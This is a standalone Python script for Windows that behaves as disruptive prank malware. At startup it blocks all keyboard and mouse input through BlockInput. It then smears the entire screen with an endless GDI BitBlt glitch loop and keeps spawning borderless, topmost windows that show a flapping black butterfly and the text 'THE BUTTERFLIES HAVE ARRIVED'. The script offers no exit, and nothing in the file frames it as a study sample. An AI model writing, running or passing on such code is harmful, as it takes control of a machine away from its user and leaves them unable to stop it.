import ctypes
import random
import threading
import time
import tkinter as tk

# Windows API constants
user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32

# Disable input to prevent closing/clicking
try:
  user32.BlockInput(True)
except Exception:
  pass


def screen_glitch():
  # GDI screen manipulation for chaotic tearing/glitching effect
  hdc = user32.GetDC(0)
  w = user32.GetSystemMetrics(0)
  h = user32.GetSystemMetrics(1)

  while True:
    x = random.randint(0, w - 200)
    y = random.randint(0, h - 200)
    # BitBlt copy screen pixels around randomly to create melting/tearing glitches
    gdi32.BitBlt(
        hdc,
        x + random.randint(-20, 20),
        y + random.randint(-20, 20),
        random.randint(100, 400),
        random.randint(100, 400),
        hdc,
        x,
        y,
        0x00CC0020,  # SRCCOPY
    )
    time.sleep(0.005)


def butterfly_window():
  root = tk.Tk()
  root.overrideredirect(True)
  root.attributes("-topmost", True)
  root.attributes("-alpha", 0.85)

  w = root.winfo_screenwidth()
  h = root.winfo_screenheight()
  win_w = 450
  win_h = 250
  x = random.randint(0, w - win_w)
  y = random.randint(0, h - win_h)
  root.geometry(f"{win_w}x{win_h}+{x}+{y}")
  root.configure(bg="#0a0a0a")

  # Warning text
  label = tk.Label(
      root,
      text="THE BUTTERFLIES HAVE ARRIVED",
      fg="#ff0033",
      bg="#0a0a0a",
      font=("Courier", 14, "bold"),
  )
  label.pack(pady=20)

  # Canvas for flying black butterfly animation
  canvas = tk.Canvas(
      root, width=win_w, height=140, bg="#0a0a0a", highlightthickness=0
  )
  canvas.pack()

  # Initial coordinates for butterfly body and wings
  bx, by = win_w / 2, 70
  body = canvas.create_oval(
      bx - 4, by - 25, bx + 4, by + 25, fill="#111111", outline="#ff0033"
  )
  left_wing = canvas.create_polygon(
      bx, by, bx - 60, by - 40, bx - 30, by + 40, fill="black", outline="#333333"
  )
  right_wing = canvas.create_polygon(
      bx, by, bx + 60, by - 40, bx + 30, by + 40, fill="black", outline="#333333"
  )

  angle = random.uniform(0, 3.14)

  def animate_butterfly():
    nonlocal angle
    angle += 0.15
    offset = random.randint(-15, 15)
    wing_flap = int(30 * abs(ctypes.windll.kernel32.GetTickCount() % 20 - 10) / 10)

    # Move wings dynamically
    canvas.coords(
        left_wing,
        bx,
        by,
        bx - 40 - wing_flap,
        by - 30 + offset,
        bx - 20,
        by + 30,
    )
    canvas.coords(
        right_wing,
        bx,
        by,
        bx + 40 + wing_flap,
        by - 30 + offset,
        bx + 20,
        by + 30,
    )
    root.after(30, animate_butterfly)

  animate_butterfly()
  root.mainloop()


def spawn_swarm():
  # Spawn multiple windows continuously
  while True:
    t = threading.Thread(target=butterfly_window)
    t.daemon = True
    t.start()
    time.sleep(0.3)


if __name__ == "__main__":
  # Start GDI glitch thread
  glitch_thread = threading.Thread(target=screen_glitch)
  glitch_thread.daemon = True
  glitch_thread.start()

  # Start window swarm thread
  swarm_thread = threading.Thread(target=spawn_swarm)
  swarm_thread.daemon = True
  swarm_thread.start()

  # Keep main thread alive
  while True:
    time.sleep(1)
